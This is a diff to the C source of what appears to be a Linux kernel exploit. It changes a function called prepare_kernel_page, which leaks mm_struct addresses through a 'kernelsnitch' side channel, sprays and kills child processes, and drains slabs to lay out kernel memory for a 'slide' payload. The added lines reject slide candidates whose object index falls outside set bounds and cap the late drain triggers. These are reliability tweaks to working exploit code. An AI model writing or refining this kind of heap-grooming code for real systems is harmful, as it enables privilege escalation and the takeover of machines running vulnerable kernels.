@@ -2258,8 +2258,39 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 #endif
 #else
+  size_t object_index = (leaked - base) / MM_STRUCT_SZ;
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
-          leaked, base, (leaked - base) / MM_STRUCT_SZ);
+          leaked, base, object_index);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_SLIDE_MIN_OBJECT_INDEX)
+  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
+      object_index < APP_SLIDE_MIN_OBJECT_INDEX) {
+    pr_warning("mm slide candidate rejected object_index=%zu min=%d\n",
+               object_index, APP_SLIDE_MIN_OBJECT_INDEX);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+#endif
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_SLIDE_MAX_OBJECT_INDEX)
+  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
+      object_index > APP_SLIDE_MAX_OBJECT_INDEX) {
+    pr_warning("mm slide candidate rejected object_index=%zu max=%d\n",
+               object_index, APP_SLIDE_MAX_OBJECT_INDEX);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+#endif
 #endif
   int slide_bank_configured = 1;
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
@@ -2408,6 +2439,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   size_t prepare_slabs = prepare_ctx.mm_cnt / mm_objs_per_slab;
   size_t drain_start = early_drain_triggers;
   size_t drain_triggers = prepare_slabs - drain_start;
+#ifdef APP_MM_LATE_DRAIN_TRIGGERS
+  if (drain_triggers > APP_MM_LATE_DRAIN_TRIGGERS) {
+    drain_triggers = APP_MM_LATE_DRAIN_TRIGGERS;
+  }
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_MM_LATE_DRAIN_TRIGGERS
   drain_triggers = APP_MM_LATE_DRAIN_TRIGGERS;
